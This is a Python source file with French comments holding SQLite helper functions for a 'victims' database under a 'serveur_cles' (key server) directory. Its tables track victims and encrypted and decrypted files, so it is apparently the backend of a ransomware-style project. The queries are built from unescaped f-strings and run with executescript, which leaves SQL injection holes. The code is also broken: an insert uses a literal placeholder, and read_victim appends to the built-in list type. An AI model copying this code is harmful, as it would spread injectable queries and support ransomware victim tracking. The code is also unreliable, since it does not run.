import sqlite3


def connect_DB():
    con = sqlite3.connect("../serveur_cles/data/victims.sqlite")  # BDD dans le fichie
    curseur = con.cursor()  # Récupération d'un curseur
    return curseur, con


# ajouter dans la bd
def add_table_victim(curseur, con, table):
    sqlAjoutVictim = f'INSERT INTO {table} VALUES (text2)'

    print(sqlAjoutVictim)
    curseur.executescript(sqlAjoutVictim)
    con.commit()

def add_table_decrypted():
    pass


def add_table_encrypted():
    pass


def add_table_state():
    pass


"""
def ajoutdecrypted(curseur, con, id, idvic, date, file):
    sqlAjoutDecrypted=f'INSERT INTO decrypted (id_decryped, id_victim, datetime, nb_file) VALUES ("{id}", "{idvic}", "{date}", "{file}")'
    print(sqlAjoutDecrypted)
    curseur.executescript(sqlAjoutDecrypted)
    con.commit()
"""

# def ajoutstates( id_state,id_victim ,datetime ,nb_file):
# def ajoutencrypted(id_encrypted, id_victim, datetime, nb_file):

# chercher dans la bd
# python


def read_victim(curseur, id=False):
    if not id:
        curseur.execute("SELECT * FROM victims")
        resultats = curseur.fetchall()
        for resultat in resultats:
            list.append(resultat)
        return list
    else:
        curseur.execute(f"SELECT * FROM victims WHERE id_victim ={id}")
        resultats = curseur.fetchone()
        for resultat in resultats:
            list.append(resultat)
        return list


def disconnect_DB(con):
    con.close()  # Déconnexion
